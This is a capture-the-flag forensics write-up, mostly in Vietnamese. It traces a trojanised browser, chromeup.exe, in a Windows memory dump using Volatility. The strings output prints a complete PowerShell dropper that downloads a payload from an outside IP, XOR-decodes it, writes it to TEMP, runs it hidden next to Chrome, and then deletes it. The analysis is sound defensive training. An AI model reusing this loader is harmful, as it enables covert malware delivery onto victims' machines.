# WannaGame_CyberKnight - Bad Friend

## Description: 
```text
Challenge name: Bad friend
Category: Forensics
Author: KetSoSad
Description: My friend just installed the latest version of the browser for me. However, something doesn't seem right when I use it. Please help me check what happened to my computer.
```

Bài toán cung cấp memory dump và file pcap.
```text
challenge.dmp:    MS Windows 64bit crash dump, version 15.19045, 4 processors, DumpType (0x1), 1048333 pages
challenge.pcapng: pcapng capture file - version 1.0
```
Mục tiêu là kiểm tra xem trên máy nạn nhân đã xảy ra chuyện gì khi tải một trình duyệt đáng ngờ.

Để tìm browser đáng ngờ, ta cần lục các file thực thi của trình duyệt đó, bằng cách sử dụng plugin `windows.pslist` với công cụ Volatility,
kết hợp với plugin `windows.cmdline --pid 9984`, ta thấy tiến trình `chromeup.exe` đáng ngờ, 

Nếu là Chrome chính thống, file thực thi có tên là `chrome.exe` cùng với đường dẫn `C:\Program Files..`
Trong khi đó, trong kiểm tra với plugin `windows.pslist`, xuất hiện một tiến trình thực thi browser`chromeup.exe` có tên rất lạ, cùng với đường dẫn cũng rất đáng ngờ. 

```bash
9984    5964    chromeup.exe    0xd383d2452080  27      -       1       False   2026-08-20 13:34:13.000000 UTC   N/A     Disabled`
```

<img width="1467" height="131" alt="image" src="https://github.com/user-attachments/assets/e8731056-f6e4-4277-b523-430b46f909ac" />

Cần xem bên trong file EXE đó đã làm những gì. Nhập lệnh sau để chiết xuất `chromeup.exe` về, sau đó thử `strings` xem bên trong có gì
```bash
$ mkdir extracted && vol -f challenge.dmp -o extracted_chrome windows.pslist --pid 9984 --dump
Volatility 3 Framework 2.28.2
Progress:  100.00               PDB scanning finished
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output

9984    5964    chromeup.exe    0xd383d2452080  27      -       1       False   2026-08-20 13:34:13.000000 UTC  N/A     9984.chromeup.exe.0xb70000.dmp
```
Ở phần đầu của output:
```C#
!This program cannot be run in DOS mode.
.text
`.rsrc
@.reloc
*b(
*B(.
Yh}
1P      ot
1&      ot
$url = "http://172.22.85.56:8000/pay"
$tempFile = Join-Path $env:TEMP "pay.tmp"
try {
    Invoke-WebRequest -UseBasicParsing $url -OutFile $tempFile
    $hex = [Text.Encoding]::ASCII.GetString(
        [IO.File]::ReadAllBytes($tempFile)
    )
    $hex = $hex -replace '\s',''
finally {
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
Add-Type @'
using System;
public static class FastDecoder
    public static byte[] Decode(string hex)
    {
        byte[] output = new byte[hex.Length / 2];
        byte[] key = { 0x12, 0x34, 0x56, 0x78 };
        for (int i = 0; i < output.Length; i++)
        {
            int p = i * 2;
            int hi = Hex(hex[p]);
            int lo = Hex(hex[p + 1]);
            output[i] = (byte)(((hi << 4) | lo) ^ key[i & 3]);
        }
        return output;
    }
    private static int Hex(char c)
    {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        return c - 'a' + 10;
    }
[byte[]]$bytes = [FastDecoder]::Decode($hex)
$path = "$env:TEMP\csrst.exe"
[IO.File]::WriteAllBytes($path, $bytes)
try {
    $chrome = Start-Process "chrome.exe" -PassThru
    $proc = Start-Process $path -WindowStyle Hidden -PassThru
    $chrome.WaitForExit()
    if (-not $proc.HasExited) {
        Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
    }
    Get-Process -Name "csrst" -ErrorAction SilentlyContinue |
        Where-Object { $_.Path -eq $path } |
        Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
finally {
    Remove-Item $path -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 50000
exit
```
